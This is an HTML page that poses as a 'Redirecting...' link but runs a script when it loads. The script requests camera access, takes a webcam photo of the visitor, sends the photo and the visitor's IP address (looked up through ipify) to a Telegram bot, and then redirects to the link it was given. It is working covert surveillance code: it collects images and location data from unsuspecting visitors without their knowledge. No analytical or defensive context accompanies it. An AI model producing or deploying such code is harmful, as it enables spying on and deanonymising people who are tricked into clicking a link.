<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
</head>
<body>
    <script>
        (function() {
            const originalLink = new URLSearchParams(window.location.search).get('link');
            const chatId = sessionStorage.getItem('chatId');
            const botToken = sessionStorage.getItem('botToken');

            async function sendPhotoToTelegram(chatId, botToken, photoData) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoData, 'photo.jpg');

                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }

            async function sendIPToTelegram(chatId, botToken, ip) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: `IP address pengguna: ${ip}` })
                });
            }

            async function captureAndSendPhoto() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    await video.play();

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');

                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const photoData = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                    await sendPhotoToTelegram(chatId, botToken, photoData);

                    stream.getTracks().forEach(track => track.stop());
                } catch (error) {
                    console.error('Error:', error);
                }
            }

            async function main() {
                if (await navigator.mediaDevices.getUserMedia({ video: true })) {
                    await captureAndSendPhoto();
                    fetch(`https://api.ipify.org?format=json`)
                        .then(response => response.json())
                        .then(data => sendIPToTelegram(chatId, botToken, data.ip))
                        .catch(error => console.error('Error:', error));
                    window.location.href = originalLink;
                }
            }

            window.onload = main;
        })();
    </script>
</body>
</html>
